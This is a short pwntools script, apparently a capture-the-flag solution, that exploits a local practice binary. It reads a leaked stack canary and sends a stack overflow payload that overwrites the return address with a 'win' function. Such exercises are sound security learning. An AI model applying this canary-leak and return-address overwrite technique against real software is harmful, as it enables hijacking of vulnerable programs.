from pwn import *

elf = context.binary = ELF("./chall")
p = process(elf.path)

f_win = p64(elf.symbols["win"])

# get stack canary
p.recvuntil(b'(')
canary = int(p.recv(18).decode(), 16)

payload = b'A' * (0x20 - 0x8) # buffer size - canary
payload += p64(canary) # canary
payload += b'B' * 0x8 # base pointer
payload += f_win # return address

p.sendline(payload)
p.interactive()

